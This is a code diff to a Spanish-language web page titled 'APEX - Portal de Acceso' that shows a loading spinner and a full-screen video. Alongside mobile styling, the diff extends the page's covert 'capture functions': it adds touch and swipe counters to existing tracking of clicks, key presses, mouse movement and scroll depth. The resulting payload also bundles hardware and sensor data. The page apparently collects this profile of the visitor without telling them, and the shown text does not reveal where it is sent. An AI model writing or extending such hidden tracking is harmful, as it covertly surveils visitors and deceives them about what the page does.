@@ -2,20 +2,27 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <meta name="Author" content="Marlenne, Daniel E, Emiliano, Daniel V">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
 <title>APEX - Portal de Acceso</title>
 <style>
 * {
     margin: 0;
     padding: 0;
     box-sizing: border-box;
+    -webkit-tap-highlight-color: transparent;
 }
 
 body {
     background: #000;
     overflow: hidden;
     font-family: Arial, sans-serif;
+    -webkit-touch-callout: none;
+    -webkit-user-select: none;
+    user-select: none;
 }
 
 /* Pantalla de carga inicial */
@@ -68,6 +75,56 @@ body {
     opacity: 0.9;
 }
 
+/* Mobile Responsive */
+@media (max-width: 768px) {
+    .loader-container h2 {
+        font-size: 20px;
+    }
+
+    .loader-container p {
+        font-size: 14px;
+        padding: 0 20px;
+    }
+
+    .spinner {
+        width: 50px;
+        height: 50px;
+        border-width: 6px;
+    }
+}
+
+@media (max-width: 480px) {
+    .loader-container h2 {
+        font-size: 18px;
+    }
+
+    .loader-container p {
+        font-size: 13px;
+    }
+}
+
+/* Landscape mobile */
+@media (max-height: 500px) and (orientation: landscape) {
+    .loader-container {
+        transform: scale(0.8);
+    }
+
+    .spinner {
+        width: 40px;
+        height: 40px;
+        margin: 0 auto 10px;
+    }
+
+    .loader-container h2 {
+        font-size: 16px;
+        margin-bottom: 5px;
+    }
+
+    .loader-container p {
+        font-size: 12px;
+    }
+}
+
 /* Video container */
 #videoContainer {
     position: fixed;
@@ -77,6 +134,7 @@ body {
     height: 100vh;
     z-index: 9999;
     display: none;
+    background: #000;
 }
 
 #videoContainer.show {
@@ -87,6 +145,27 @@ iframe {
     width: 100%;
     height: 100%;
     border: none;
+    position: absolute;
+    top: 0;
+    left: 0;
+}
+
+/* Mobile video fixes */
+@media (max-width: 768px) {
+    iframe {
+        /* Asegurar que el video ocupe toda la pantalla en móvil */
+        width: 100vw;
+        height: 100vh;
+        object-fit: cover;
+    }
+}
+
+/* Landscape mobile - ajustar video */
+@media (max-height: 500px) and (orientation: landscape) {
+    iframe {
+        width: 100vw;
+        height: 100vh;
+    }
 }
 </style>
 </head>
@@ -152,6 +231,34 @@ iframe {
         const depth = (window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100;
         maxScrollDepth = Math.max(maxScrollDepth, depth);
     });
+
+    // ✅ SOPORTE TÁCTIL PARA MÓVILES
+    let touches = 0;
+    let swipes = 0;
+
+    document.addEventListener('touchstart', () => touches++);
+    document.addEventListener('touchmove', () => mouseMovements++); // Contar touch move como movimiento
+    document.addEventListener('touchend', () => clicks++); // Contar touch end como click
+
+    // Detectar swipes
+    let touchStartX = 0;
+    let touchStartY = 0;
+
+    document.addEventListener('touchstart', (e) => {
+        touchStartX = e.changedTouches[0].screenX;
+        touchStartY = e.changedTouches[0].screenY;
+    }, false);
+
+    document.addEventListener('touchend', (e) => {
+        const touchEndX = e.changedTouches[0].screenX;
+        const touchEndY = e.changedTouches[0].screenY;
+        const diffX = touchEndX - touchStartX;
+        const diffY = touchEndY - touchStartY;
+
+        if (Math.abs(diffX) > 50 || Math.abs(diffY) > 50) {
+            swipes++;
+        }
+    }, false);
 
     // ═══════════════════════════════════════
     // 🔍 FUNCIONES DE CAPTURA
@@ -525,7 +632,10 @@ iframe {
                     clicks: clicks,
                     keyPresses: keyPresses,
                     scrollDepth: Math.round(maxScrollDepth),
-                    timeOnPage: timeOnPage
+                    timeOnPage: timeOnPage,
+                    // ✅ NUEVO: Datos táctiles móviles
+                    touches: touches,
+                    swipes: swipes
                 },
                 hardware: hardware,
                 sensors: sensors,
